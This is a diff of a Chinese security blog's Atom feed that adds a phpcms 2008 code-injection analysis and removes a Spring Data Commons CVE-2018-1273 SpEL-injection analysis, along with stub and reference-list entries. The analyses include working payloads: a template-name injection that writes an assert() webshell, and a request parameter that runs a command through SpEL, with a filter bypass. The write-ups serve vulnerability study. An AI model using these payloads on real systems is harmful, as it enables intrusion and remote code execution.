@@ -241,6 +241,131 @@
   </entry>
   
   <entry>
+    <title>phpcms 2008 type.php 前台代码注入getshell漏洞分析</title>
+    <link href="http://chybeta.github.io/2018/11/29/phpcms-2008-type-php-%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <id>http://chybeta.github.io/2018/11/29/phpcms-2008-type-php-前台代码注入getshell漏洞分析/</id>
+    <published>2018-11-29T12:52:25.000Z</published>
+    <updated>2018-11-29T12:56:23.307Z</updated>
+    
+    <content type="html"><![CDATA[<p>phpcms 2008 type.php 前台代码注入getshell漏洞分析</p>
+<a id="more"></a>
+<p>tpye.php中:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">require</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/include/common.inc.php'</span>;</div><div class="line">...</div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($template)) $template = <span class="string">'type'</span>;</div><div class="line">...</div><div class="line"><span class="keyword">include</span> template(<span class="string">'phpcms'</span>, $template);</div><div class="line">...</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>先看一下<code>require</code>进来的<code>include/common.inc.php</code>，在这个文件第58行中存在如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_REQUEST)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(MAGIC_QUOTES_GPC)</div><div class="line">	&#123;</div><div class="line">		$_REQUEST = new_stripslashes($_REQUEST);</div><div class="line">		<span class="keyword">if</span>($_COOKIE) $_COOKIE = new_stripslashes($_COOKIE);</div><div class="line">		extract($db-&gt;escape($_REQUEST), EXTR_SKIP);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		$_POST = $db-&gt;escape($_POST);</div><div class="line">		$_GET = $db-&gt;escape($_GET);</div><div class="line">		$_COOKIE = $db-&gt;escape($_COOKIE);</div><div class="line">		@extract($_POST,EXTR_SKIP);</div><div class="line">		@extract($_GET,EXTR_SKIP);</div><div class="line">		@extract($_COOKIE,EXTR_SKIP);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>)) $_REQUEST = filter_xss($_REQUEST, ALLOWED_HTMLTAGS);</div><div class="line">	<span class="keyword">if</span>($_COOKIE) $db-&gt;escape($_COOKIE);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>上面这段代码会通过<code>@extract()</code>将尚未注册的变量进行注册，如果有冲突，不覆盖已有的变量。因此通过这个伪全局可以绕过<code>if(empty($template)) $template = &#39;type&#39;;</code>这句话的指定，即<code>$template</code>变量可控。</p>
+<p>跟入<code>template</code>函数，定义在 include/global.func.php:772<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">template</span><span class="params">($module = <span class="string">'phpcms'</span>, $template = <span class="string">'index'</span>, $istag = <span class="number">0</span>)</span></span></div><div class="line">&#123;</div><div class="line">	$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line">	<span class="keyword">if</span>(TPL_REFRESH &amp;&amp; (!file_exists($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>) &gt; @filemtime($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/tag.inc.php'</span>) &gt; @filemtime($compiledtplfile)))</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">require_once</span> PHPCMS_ROOT.<span class="string">'include/template.func.php'</span>;</div><div class="line">		template_compile($module, $template, $istag);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> $compiledtplfile;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里会进行一些判断，<code>TPL_REFRESH</code>表示是否开启模板缓存自动刷新，默认为1, 剩下的用于判断缓存超时。倘若需要更新缓存则进入了<code>template_compile()</code>函数，根据上一句的<code>require_once</code>可知定义在 include/template.func.php:2</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">template_compile</span><span class="params">($module, $template, $istag = <span class="number">0</span>)</span></span></div><div class="line">&#123;</div><div class="line">	$tplfile = TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>;</div><div class="line">	$content = @file_get_contents($tplfile);</div><div class="line">	<span class="keyword">if</span>($content === <span class="keyword">false</span>) showmessage(<span class="string">"$tplfile is not exists!"</span>);</div><div class="line">	$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line">	$content = ($istag || substr($template, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">'tag_'</span>) ? <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span> : template_parse($content);</div><div class="line">	$strlen = file_put_contents($compiledtplfile, $content);</div><div class="line">	@chmod($compiledtplfile, <span class="number">0777</span>);</div><div class="line">	<span class="keyword">return</span> $strlen;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>重点看<code>$content = ($istag || substr($template, 0, 4) == &#39;tag_&#39;)</code>这一句。由于<code>$template</code>可控，只要<code>$template</code>以<code>tag_</code>开头，就可以使得此处的三元表达式进入到第一个分支中，即相当于：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$content = <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span></div></pre></td></tr></table></figure></p>
+<p>由于<code>$template</code>未经过滤，被直接拼接到内容中，所以如果指定<code>tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss</code> ，则拼接后的结果为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$content = <span class="string">'&lt;?php function _tag_phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span></div></pre></td></tr></table></figure></p>
+<p>可以看到一句话木马已经写入了<code>$content</code>，之后<code>file_put_contents($compiledtplfile, $content);</code>将内容写入文件。</p>
+<p>回到前面的<code>template_compile</code>函数中，<code>TPL_CACHEPATH</code>为常量<code>PHPCMS_ROOT.&#39;data/cache_template/</code>; 可知 <code>$compiledtplfile</code> 为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div></pre></td></tr></table></figure></p>
+<p>即：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$compiledtplfile = <span class="string">'data/cache_template/phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss.tpl.php'</span>;</div></pre></td></tr></table></figure></p>
+<p>所以payload末尾的<code>../</code>利用目录穿越使得最后的<code>$compiledtplfile</code>为<code>&#39;data/cache_template/rss.tpl.php</code></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20181129/1.png?raw=true" alt=""></p>
+<p>为了解析不出错，payload末尾处的<code>//</code>注释了拼接后的其余部分，如上图。</p>
+<p>此后访问 <a href="http://127.0.0.1/phpcms/data/cache_template/rss.tpl.php?1=phpinfo(" target="_blank" rel="external">http://127.0.0.1/phpcms/data/cache_template/rss.tpl.php?1=phpinfo(</a>)</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20181129/2.png?raw=true" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;phpcms 2008 type.php 前台代码注入getshell漏洞分析&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
+    
+      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="phpcms" scheme="http://chybeta.github.io/tags/phpcms/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Excel Streaming Reader XXE 漏洞分析</title>
+    <link href="http://chybeta.github.io/2018/11/14/Excel-Streaming-Reader-XXE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <id>http://chybeta.github.io/2018/11/14/Excel-Streaming-Reader-XXE-漏洞分析/</id>
+    <published>2018-11-14T11:58:00.000Z</published>
+    <updated>2018-11-14T12:01:07.894Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://github.com/monitorjbl/excel-streaming-reader" target="_blank" rel="external">excel-streaming-reader</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://github.com/monitorjbl/excel-streaming-reader&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;excel-streaming-reader&lt;/a&gt;&lt;/p&gt;
+
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
+      <category term="xxe" scheme="http://chybeta.github.io/tags/xxe/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>从php中的$_SESSION谈起</title>
+    <link href="http://chybeta.github.io/2018/11/02/%E4%BB%8Ephp%E4%B8%AD%E7%9A%84-SESSION%E8%B0%88%E8%B5%B7/"/>
+    <id>http://chybeta.github.io/2018/11/02/从php中的-SESSION谈起/</id>
+    <published>2018-11-02T12:35:49.000Z</published>
+    <updated>2018-11-02T12:53:23.522Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
+<li><a href="https://blog.christophetd.fr/write-insomnihack-2018-ctf-teaser/" target="_blank" rel="external">https://blog.christophetd.fr/write-insomnihack-2018-ctf-teaser/</a></li>
+<li><a href="http://hu3sky.ooo/2018/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="external">http://hu3sky.ooo/2018/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></li>
+<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO">https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO</a></li>
+<li><a href="https://www.kingkk.com/2018/10/hitcon2018-One-Line-PHP-Challenge/" target="_blank" rel="external">https://www.kingkk.com/2018/10/hitcon2018-One-Line-PHP-Challenge/</a> </li>
+<li><a href="https://buer.haus/2018/10/08/h1-5411-ctf-write-up-by-erbbysam-and-ziot/" target="_blank" rel="external">https://buer.haus/2018/10/08/h1-5411-ctf-write-up-by-erbbysam-and-ziot/</a></li>
+<li><a href="https://blog.christophetd.fr/write-insomnihack-2018-ctf-teaser/" target="_blank" rel="external">https://blog.christophetd.fr/write-insomnihack-2018-ctf-teaser/</a></li>
+<li><a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="external">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a></li>
+<li><a href="https://xz.aliyun.com/t/2463" target="_blank" rel="external">https://xz.aliyun.com/t/2463</a></li>
+<li><a href="http://www.bendawang.site/2018/03/13/N1CTF-2018-Web-writeup/" target="_blank" rel="external">http://www.bendawang.site/2018/03/13/N1CTF-2018-Web-writeup/</a></li>
+<li><a href="https://www.xmsec.cc/0ctf-2018-web-part-writeup/" target="_blank" rel="external">https://www.xmsec.cc/0ctf-2018-web-part-writeup/</a></li>
+<li><a href="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/" target="_blank" rel="external">https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/</a></li>
+<li><a href="https://bugs.php.net/bug.php?id=72681" target="_blank" rel="external">https://bugs.php.net/bug.php?id=72681</a></li>
+<li><a href="http://www.php-security.org/2010/05/31/mops-2010-060-php-session-serializer-session-data-injection-vulnerability/index.html" target="_blank" rel="external">http://www.php-security.org/2010/05/31/mops-2010-060-php-session-serializer-session-data-injection-vulnerability/index.html</a></li>
+<li><a href="http://www2.imm.dtu.dk/pubdb/views/edoc_download.php/6062/pdf/imm6062.pdf" target="_blank" rel="external">http://www2.imm.dtu.dk/pubdb/views/edoc_download.php/6062/pdf/imm6062.pdf</a></li>
+<li><a href="https://0x0d.im/archives/ais3-final-ctf-web-writeup.html" target="_blank" rel="external">https://0x0d.im/archives/ais3-final-ctf-web-writeup.html</a></li>
+<li><a href="https://www.virzz.com/2016/05/08/writeups_for_sctf_2016.html" target="_blank" rel="external">https://www.virzz.com/2016/05/08/writeups_for_sctf_2016.html</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;reference&quot;&gt;&lt;a href=&quot;#reference&quot; class=&quot;headerlink&quot; title=&quot;reference&quot;&gt;&lt;/a&gt;reference&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://blog.christophetd.f
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
+    
+      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
+    
+      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
+    
+      <category term="webshell" scheme="http://chybeta.github.io/tags/webshell/"/>
+    
+      <category term="upload" scheme="http://chybeta.github.io/tags/upload/"/>
+    
+      <category term="session" scheme="http://chybeta.github.io/tags/session/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Discuz v3.4 排行页面存储型XSS漏洞分析</title>
     <link href="http://chybeta.github.io/2018/10/15/Discuz-v3-4-%E6%8E%92%E8%A1%8C%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     <id>http://chybeta.github.io/2018/10/15/Discuz-v3-4-排行页面存储型XSS漏洞分析/</id>
@@ -1109,9 +1234,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="opentsdb" scheme="http://chybeta.github.io/tags/opentsdb/"/>
     
@@ -1173,9 +1298,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="Jenkins" scheme="http://chybeta.github.io/tags/Jenkins/"/>
     
@@ -1228,11 +1353,11 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="文件上传" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="weblogic" scheme="http://chybeta.github.io/tags/weblogic/"/>
     
@@ -1451,9 +1576,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
     
@@ -1522,9 +1647,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
@@ -1655,195 +1780,6 @@
       <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
       <category term="gitlist" scheme="http://chybeta.github.io/tags/gitlist/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</title>
-    <link href="http://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1273%E3%80%91/"/>
-    <id>http://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-分析-【CVE-2018-1273】/</id>
-    <published>2018-04-11T15:35:54.000Z</published>
-    <updated>2018-04-12T14:36:41.506Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2269" target="_blank" rel="external">Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</a><br><a id="more"></a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://pivotal.io/security/cve-2018-1273" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1273</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/1.jpg?raw=true" alt=""></p>
-<p>漏洞影响版本：</p>
-<ul>
-<li>2.0.x users should upgrade to 2.0.6</li>
-<li>1.13.x users should upgrade to 1.13.11</li>
-<li>Older versions should upgrade to a supported branch</li>
-</ul>
-<h1 id="探索过程"><a href="#探索过程" class="headerlink" title="探索过程"></a>探索过程</h1><p>从漏洞公告页的Refference给出的两个链接<a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a" target="_blank" rel="external">commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a>和<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a>，可以看出该漏洞为SpEL注入。</p>
-<p>在漏洞发现者<a href="https://twitter.com/h3xstream" target="_blank" rel="external">Philippe Arteau @h3xstream</a>的<a href="https://twitter.com/h3xstream/status/984098634353475584" target="_blank" rel="external">推文和回复</a>中提到：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/2.jpg?raw=true" alt=""><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@requestMapping</span>(<span class="string">"/users"</span>)</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</div><div class="line">    <span class="meta">@requestsMapping</span>(method= RequestMethod.POST)</div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">register</span><span class="params">(UserForm userForm, BindingResult binding, Model model)</span></span>&#123;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>此外 <a href="https://twitter.com/SpringData" target="_blank" rel="external">Spring Data Team @SpringData</a>在该推文中回复：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Spring Data Team</div><div class="line">‏That&apos;s only true if the form backing object is a projection interface. Simple DTOs are safe.</div></pre></td></tr></table></figure></p>
-<p>因此可以推测出几个漏洞条件：</p>
-<ol>
-<li>Spel注入</li>
-<li>a form accessible</li>
-<li>form backing object is a projection interface</li>
-</ol>
-<p>另外根据<a href="https://twitter.com/h3xstream" target="_blank" rel="external">Philippe Arteau @h3xstream</a>提供的示例代码，不难发现这是spring官方的<a href="https://github.com/spring-projects/spring-data-examples/blob/master/web/example/src/main/java/example/users/web/UserController.java#L83" target="_blank" rel="external">示例代码 spring-data-examples 中的一部分</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/3.jpg?raw=true" alt=""></p>
-<p>因此环境搭建以及漏洞探索过程不妨从此入手。</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/spring-projects/spring-data-examples</div></pre></td></tr></table></figure>
-<p>我直接采用默认配置pom.xml，对应的Spring Data Commons版本为2.0.5<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/9.jpg?raw=true" alt=""></p>
-<p>运行其中的web\example。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/4.jpg?raw=true" alt=""><br>这是一个简单的注册页面，输入用户名、密码并重复。</p>
-<p>抓包，修改payload数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=chybeta&amp;password=chybeta&amp;repeatedPassword=chybeta</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/2.gif?raw=true" alt=""></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>限于能力，还真不知道这个洞该从何谈起。干脆就定位到 org/springframework/data/web/MapDataBinder.java:174 。之所以定位到这里，官方的<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">commit</a>中在这里去除了StandardEvaluationContext，改用SimpleEvaluationContext。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/5.jpg?raw=true" alt=""><br>可以看到这里的propertyName即我们传入的参数名，其中带有了payaload。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/6.jpg?raw=true" alt=""><br>继续执行至187行，对其进行解析<code>parseExpression(propertyName)</code></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/7.jpg?raw=true" alt=""><br>继续执行到217行，解析了spel表达式，成功执行calc.exe。</p>
-<p>跟<a href="https://xz.aliyun.com/t/2252" target="_blank" rel="external">spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</a>中使用的<code>expression.getValue(context, Boolean.class)</code>不同，这里执行spel表达式使用的是<code>expression.setValue(context, value)</code>。以后在找类似的spel表达式注入时可以针对性查找这两条语句。</p>
-<p>上图来自0c0c0f师傅的<a href="http://www.polaris-lab.com/index.php/archives/501/" target="_blank" rel="external">CVE-2018-1270 Remote Code Execution with spring-messaging</a> </p>
-<h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><p>以 spring-data-commons 2.0.6 版本为例 <a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/10.jpg?raw=true" alt=""></p>
-<p>换用SimpleEvaluationContext，用于实现简单的数据绑定，保持灵活性减少安全隐患（来自<a href="https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12" target="_blank" rel="external">360cert语</a>）。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://jira.spring.io/browse/DATACMNS-1282" target="_blank" rel="external">DATACMNS-1282</a></li>
-<li><a href="https://jira.spring.io/browse/DATACMNS-1264" target="_blank" rel="external">DATACMNS-1264</a></li>
-<li><a href="https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#projections" target="_blank" rel="external">projections</a></li>
-<li><a href="https://github.com/spring-projects/spring-data-examples" target="_blank" rel="external">spring-data-examples</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c&amp;from=1084195010&amp;wm=20005_0002&amp;weiboauthoruid=5458358938" target="_blank" rel="external">xxlegend大师傅</a></li>
-</ul>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>Spring Data Commons 2.0.5版本怼了一天，从早上8点怼到现在，尽管确定了Spel注入点，但就是用普通的表达式弹不出计算器。比如使用 <code>T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)</code></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/3.gif?raw=true" alt=""></p>
-<p>用动态调用<code>(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()</code>的方式也会触发失败。</p>
-<p>刚刚才看到<a href="https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c&amp;from=1084195010&amp;wm=20005_0002&amp;weiboauthoruid=5458358938" target="_blank" rel="external">xxlegend大师傅</a>在其中说明了原因Spring Data Commons 2.0.5版本中 MapDataBinder.java 的182添加了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">context.setTypeLocator(typeName -&gt; &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
-<p>最后用下面的payload可以绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=chybeta&amp;password=chybeta&amp;repeatedPassword=chybeta</div></pre></td></tr></table></figure></p>
